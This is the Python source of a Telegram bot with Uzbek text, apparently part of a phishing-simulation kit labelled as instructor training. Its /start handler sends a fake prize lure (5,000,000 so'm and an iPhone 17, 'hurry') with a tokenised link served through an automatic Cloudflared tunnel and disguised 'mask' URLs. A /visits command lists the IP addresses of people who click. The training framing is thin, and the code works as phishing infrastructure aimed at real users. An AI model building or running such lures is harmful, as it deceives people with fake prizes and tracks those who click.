"""
Telegram bot — avtomatik tunnel + mask URL bilan ishlaydi.
/start: salomlashadi, havola va tugma beradi (qo'lda yozish shart emas).
"""

import logging

from aiogram import Dispatcher, Router
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.types import Message

from bot.keyboards import prize_link_keyboard
from bot.services.api_client import (
    build_simulation_url,
    create_training_session,
    fetch_mask_urls,
    fetch_tunnel_status,
)

logger = logging.getLogger(__name__)
router = Router()


def _welcome_text(simulation_url: str, masks: dict | None) -> str:
    url1 = masks.get("url_1", simulation_url) if masks else simulation_url
    url3 = masks.get("url_3", "") if masks else ""

    text = (
        "👋 <b>Salom!</b>\n\n"
        "🎉 Sizda <b>5 000 000 so'm</b> pul va <b>iPhone 17</b> "
        "yutib olish imkoniyati bor!\n\n"
        "⏰ <b>Shoshiling!</b> Bu taklif cheklangan vaqt davomida amal qiladi.\n\n"
        "👇 <b>Hoziroq bosing:</b>"
    )
    if url3:
        text += f"\n\n🔗 <code>{url3}</code>"
    return text


ABOUT_TEXT = """
🛡️ <b>Ta'lim simulyatsiyasi</b> (instruktor)

Cloudflared avtomatik havola yaratadi.
Telegram bot havolani o'zi beradi.

/status — tunnel + mask URL
/visits — tashrif IP lari
"""


@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id if message.from_user else 0

    session_data = await create_training_session(user_id)
    if not session_data:
        await message.answer(
            "⚠️ Server ishlamayapti.\n"
            "<code>bash scripts/start-training.sh</code>"
        )
        return

    token = session_data.get("token", "")
    simulation_url = build_simulation_url(token)
    masks = await fetch_mask_urls()

    await message.answer(
        _welcome_text(simulation_url, masks),
        reply_markup=prize_link_keyboard(simulation_url),
    )


@router.message(Command("link"))
async def cmd_link(message: Message):
    user_id = message.from_user.id if message.from_user else 0
    session_data = await create_training_session(user_id)
    if not session_data:
        await message.answer("⚠️ Backend ulanmagan.")
        return
    url = build_simulation_url(session_data["token"])
    await message.answer(
        "👇 Havola:",
        reply_markup=prize_link_keyboard(url),
    )


@router.message(Command("status"))
async def cmd_status(message: Message):
    status = await fetch_tunnel_status()
    masks = await fetch_mask_urls()
    if not status:
        await message.answer("⚠️ Backend ulanmagan.")
        return

    public = status.get("public_url") or "—"
    tunnel = status.get("tunnel_type", "none")

    text = (
        "📡 <b>Tunnel holati</b>\n\n"
        f"🔗 Turi: <b>{tunnel}</b>\n\n"
        f"[-] URL 1:\n<code>{public}</code>\n"
    )
    if masks:
        text += f"\n[-] URL 2:\n<code>{masks.get('url_2', '')}</code>\n"
        text += f"\n[-] URL 3 (mask):\n<code>{masks.get('url_3', '')}</code>\n"

    text += "\n\nFoydalanuvchi <b>/start</b> yuboradi — havola avtomatik."
    await message.answer(text)


@router.message(Command("visits"))
async def cmd_visits(message: Message):
    """Instruktor: kim kirganini ko'rish (IP — ta'lim uchun)."""
    import httpx
    import os
    backend = os.getenv("LOCAL_API_URL", "http://127.0.0.1:8000")
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            r = await client.get(f"{backend}/api/visits/recent")
            if r.status_code != 200:
                await message.answer("⚠️ Ma'lumot yo'q.")
                return
            visits = r.json().get("visits", [])
            if not visits:
                await message.answer("📭 Hali tashrif yo'q.\n/start yuboring va havolani bosing.")
                return
            lines = ["👁 <b>Oxirgi tashriflar (ta'lim):</b>\n"]
            for v in visits[-10:]:
                lines.append(f"• IP: <code>{v.get('ip')}</code>")
            await message.answer("\n".join(lines))
    except Exception:
        await message.answer("⚠️ Backend ulanmagan.")


@router.message(Command("about"))
async def cmd_about(message: Message):
    await message.answer(ABOUT_TEXT)


@router.message(Command("tunnel"))
async def cmd_tunnel(message: Message):
    await message.answer(
        "🔧 <code>bash scripts/start-training.sh</code>\n\n"
        "Tanlov <b>2 — Cloudflared</b> (avto havola)\n"
        "Havola o'zi yaratiladi — yozish shart emas."
    )


def register_handlers(dp: Dispatcher) -> None:
    dp.include_router(router)
